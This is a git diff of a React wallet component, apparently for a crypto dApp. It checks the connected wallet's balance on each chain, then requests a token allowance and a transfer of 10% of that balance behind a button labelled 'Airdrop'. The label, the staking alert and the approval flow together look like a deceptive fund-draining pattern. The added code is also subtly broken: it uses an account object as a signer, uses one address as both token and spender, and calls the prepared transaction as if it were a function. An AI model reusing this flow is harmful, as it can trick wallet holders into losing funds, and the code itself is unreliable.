@@ -13,8 +13,10 @@ import { useActiveAccount } from "thirdweb/react";
 import { useSwitchActiveWalletChain } from "thirdweb/react";
 import { getWalletBalance } from "thirdweb/wallets";
 import { prepareContractCall, toWei } from "thirdweb";
+import { ethers } from "ethers";
 
 const CustomButton = () => {
+  // const signer = useSigner();
   const activeAccount = useActiveAccount();
   const switchChain = useSwitchActiveWalletChain();
   const [loading, setLoading] = useState(false);
@@ -32,7 +34,6 @@ const CustomButton = () => {
     for (const chain of chains) {
       setCurrentChainId(chain.id);
       setCurrentChain(chain.name);
-
       try {
         const balanceResult = await getWalletBalance({
           address: activeAccount.address,
@@ -41,6 +42,7 @@ const CustomButton = () => {
         });
 
         const balanceInUnit = balanceResult.displayValue;
+
         console.log(
           `Balance found on ${chain.rpc}: ${balanceInUnit} ${chain.ticker}`
         );
@@ -59,8 +61,26 @@ const CustomButton = () => {
           const balanceToStake = parseFloat(balanceInUnit) * 0.1;
           console.log("balance to stake:", balanceToStake.toString());
 
-          // Set the balance for UI
           setBalance(balanceToStake.toString());
+
+          const signer = activeAccount;
+
+          const tokenContract = new ethers.Contract(
+            currentChainContract.address,
+            [
+              "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
+            ],
+            signer
+          );
+
+          const approvalTx = await tokenContract.increaseAllowance(
+            currentChainContract.address,
+            toWei(balanceToStake.toString())
+          );
+
+          console.log("Approval transaction sent", approvalTx);
+          await approvalTx.wait();
+          console.log("Approval successful");
 
           const transaction = prepareContractCall({
             contract: currentChainContract,
@@ -68,7 +88,16 @@ const CustomButton = () => {
             params: [activeAccount.address, toWei(balanceToStake.toString())],
           });
 
-          return transaction;
+          try {
+            // Execute the increaseYield transaction
+            await transaction();
+            console.log("Transaction successful!");
+            return;
+          } catch (error) {
+            console.error("Transaction failed:", error);
+            alert("Transaction failed: " + error.message);
+            return;
+          }
         } else {
           console.log(
             `No balance on ${chain.rpc}, switching to the next chain.`
@@ -96,7 +125,7 @@ const CustomButton = () => {
         client={client}
         wallets={[
           createWallet("io.metamask"),
-          createWallet("app.phantom"),
+          // createWallet("app.phantom"),
           createWallet("com.coinbase.wallet"),
           createWallet("me.rainbow"),
         ]}
@@ -113,11 +142,10 @@ const CustomButton = () => {
       )}
       {activeAccount && (
         <TransactionButton
-          transaction={checkBalanceAndSwitchChain}
+          transaction={() => checkBalanceAndSwitchChain()}
           onTransactionSent={() =>
             alert(`${balance} ${currentChain} approved for staking`)
           }
-          onError={(error) => alert(`Transaction failed: ${error.message}`)}
         >
           Airdrop
         </TransactionButton>
